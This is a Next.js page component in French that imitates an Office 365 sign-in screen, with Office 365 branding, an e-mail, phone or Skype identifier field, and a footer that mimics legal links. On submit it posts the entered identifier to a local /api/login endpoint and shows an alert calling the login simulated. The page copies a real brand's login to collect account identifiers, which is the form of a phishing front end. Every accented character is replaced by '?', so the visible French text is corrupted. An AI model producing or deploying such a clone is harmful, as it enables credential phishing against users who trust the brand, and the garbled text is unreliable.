"use client";

import { useState } from "react";

export default function Page() {
  const [identifier, setIdentifier] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    if (!identifier.trim()) {
      setError("Veuillez entrer votre e-mail, t?l?phone ou identifiant Skype.");
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier }),
      });
      if (!res.ok) {
        throw new Error("?chec de la connexion");
      }
      // Simulation de redirection apr?s succ?s
      alert("Connexion simul?e r?ussie");
    } catch (err) {
      setError("Impossible de traiter la demande. R?essayez.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen bg-grid">
      <div className="page-shell">
        <section className="panel" aria-labelledby="title">
          <div className="brand">
            <div className="logo" aria-hidden />
            <div className="brand-text" aria-label="Office 365">Office 365</div>
          </div>

          <h1 id="title" className="title">Se connecter</h1>

          <form onSubmit={handleSubmit} className="form" noValidate>
            <label htmlFor="id" className="label">Adresse e-mail, t?l?phone ou Skype</label>
            <input
              id="id"
              name="identifier"
              type="text"
              autoComplete="username"
              inputMode="email"
              className={`input ${error ? "input-error" : ""}`}
              placeholder="nom@exemple.com"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              aria-invalid={!!error}
              aria-describedby={error ? "id-error" : undefined}
            />
            {error && (
              <p id="id-error" className="error" role="alert">{error}</p>
            )}

            <button type="submit" className="btn" disabled={loading}>
              {loading ? "Veuillez patienter?" : "Suivant"}
            </button>
          </form>

          <div className="links">
            <a href="#" className="link">Options de connexion</a>
          </div>
        </section>

        <footer className="footer">
          <nav aria-label="Mentions l?gales" className="footer-nav">
            <a href="#" className="foot-link">Conditions d'utilisation</a>
            <span aria-hidden>?</span>
            <a href="#" className="foot-link">Confidentialit? et cookies</a>
          </nav>
          <div className="copyright">? 2025</div>
        </footer>
      </div>
    </main>
  );
}
